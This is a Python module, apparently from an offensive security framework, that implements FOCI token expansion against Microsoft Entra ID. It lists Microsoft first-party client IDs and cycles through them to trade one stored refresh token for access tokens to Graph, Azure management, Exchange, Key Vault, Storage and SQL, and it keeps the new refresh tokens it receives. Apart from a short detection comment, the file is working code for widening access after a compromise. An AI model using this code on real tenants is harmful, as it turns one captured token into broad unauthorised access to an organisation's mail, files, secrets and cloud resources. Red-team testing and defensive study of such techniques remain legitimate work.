# ================================================================
# MODULE: quantum_mechanic.providers.entra.foci
# ----------------------------------------------------------------
# PURPOSE:   FOCI (Family of Client IDs) token expansion.
#
#            One FOCI refresh token unlocks access tokens for all
#            Microsoft surfaces. Techniques never manage this —
#            EntraTokenStore.best_token() calls foci_expand()
#            transparently when no direct access token exists.
#
# DETECTION (Blue Team):
#   Azure AD Sign-in Logs: Non-interactive sign-ins from multiple
#   application IDs in rapid succession using the same refresh
#   token — distinctive pattern of FOCI chaining.
# ================================================================

from __future__ import annotations

import logging
from typing import TYPE_CHECKING

import httpx

if TYPE_CHECKING:
    from quantum_mechanic.providers.entra.token_store import EntraToken, EntraTokenStore

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------
# Known FOCI member client IDs.
# One refresh token from any of these can acquire tokens for all.
# ----------------------------------------------------------------
FOCI_CLIENT_IDS: dict[str, str] = {
    "d3590ed6-52b3-4102-aeff-aad2292ab01c": "Microsoft Office",
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264": "Microsoft Teams",
    "ab9b8c07-8f02-4f72-87fa-80105867a763": "OneDrive",
    "27922004-5251-4030-b22d-91ecd9a37ea4": "Outlook Mobile",
    "4765445b-32c6-49b0-83e6-1d93765276ca": "Office Web",
    "00b41c95-dab0-4487-9791-b9d2c32c80f2": "Office 365 Management",
    "4345a7b9-9a63-4910-a426-35363201d503": "O365 Shell Mobile",
}

# Default client to use for FOCI expansion when none is specified.
FOCI_DEFAULT_CLIENT = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# ----------------------------------------------------------------
# Resource → typical FOCI client mapping.
# Used to pick the most appropriate client for each resource.
# ----------------------------------------------------------------
RESOURCE_CLIENT_HINTS: dict[str, str] = {
    "https://graph.microsoft.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://management.azure.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://outlook.office.com": "27922004-5251-4030-b22d-91ecd9a37ea4",
    "https://substrate.office.com": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "https://vault.azure.net": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://storage.azure.com": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "https://database.windows.net": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
}

TOKEN_ENDPOINT = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"


def foci_expand(
    store: EntraTokenStore,
    resource: str,
    client: httpx.Client | None = None,
) -> EntraToken | None:
    """Acquire an access token for resource using a stored FOCI refresh token.

    Tries the resource-appropriate client first, then falls back through
    the full FOCI member list until one succeeds.

    Returns the new access token (already added to the store) or None.
    """
    from quantum_mechanic.providers.entra.token_store import token_from_jwt

    refresh = store.foci_refresh_token()
    if not refresh:
        logger.debug("foci_expand: no FOCI refresh token in store")
        return None

    tenant = store.tenant_id or refresh.tenant_id or "common"
    url = TOKEN_ENDPOINT.format(tenant=tenant)

    # Try resource-hinted client first, then all FOCI members.
    hint = RESOURCE_CLIENT_HINTS.get(resource.rstrip("/"), FOCI_DEFAULT_CLIENT)
    clients_to_try = [hint] + [c for c in FOCI_CLIENT_IDS if c != hint]

    owned = client is None
    http = client or httpx.Client(timeout=30)

    try:
        for client_id in clients_to_try:
            scope = resource.rstrip("/") + "/.default"
            try:
                resp = http.post(
                    url,
                    data={
                        "grant_type": "refresh_token",
                        "client_id": client_id,
                        "refresh_token": refresh.value,
                        "scope": scope,
                    },
                )
                data = resp.json()

                if "error" in data:
                    error = data.get("error_description", data["error"])
                    guidance = store.cap_guidance(error)
                    if guidance:
                        logger.warning(guidance)
                    logger.debug(
                        "foci_expand: client %s failed for %s: %s",
                        client_id,
                        resource,
                        error,
                    )
                    continue

                access_jwt = data.get("access_token", "")
                if not access_jwt:
                    continue

                access_tok = token_from_jwt(
                    access_jwt,
                    token_type="access_token",
                    resource=resource,
                    client_id=client_id,
                )
                store.add_token(access_tok)

                # Persist any new refresh token returned by the server.
                if "refresh_token" in data:
                    new_refresh = token_from_jwt(
                        data["refresh_token"],
                        token_type="refresh_token",
                        resource=resource,
                        client_id=client_id,
                    )
                    store.add_token(new_refresh)

                logger.debug(
                    "foci_expand: acquired access token for %s via %s (%s)",
                    resource,
                    FOCI_CLIENT_IDS.get(client_id, client_id),
                    client_id,
                )
                return access_tok

            except httpx.HTTPError as e:
                logger.debug("foci_expand: HTTP error for client %s: %s", client_id, e)
                continue

    finally:
        if owned:
            http.close()

    logger.warning("foci_expand: all FOCI clients exhausted for resource %s", resource)
    return None


def foci_expand_all(
    store: EntraTokenStore,
    client: httpx.Client | None = None,
) -> dict[str, bool]:
    """Attempt FOCI expansion for all known resources.

    Returns a mapping of resource → success.
    Used after initial token import to pre-warm the store.
    """
    from quantum_mechanic.providers.entra.token_store import (
        ARM,
        EXCHANGE,
        GRAPH,
        SQL,
        STORAGE,
        SUBSTRATE,
        VAULT,
    )

    resources = [GRAPH, ARM, EXCHANGE, SUBSTRATE, VAULT, STORAGE, SQL]
    results: dict[str, bool] = {}

    owned = client is None
    http = client or httpx.Client(timeout=30)
    try:
        for resource in resources:
            tok = foci_expand(store, resource, client=http)
            results[resource] = tok is not None
    finally:
        if owned:
            http.close()

    return results
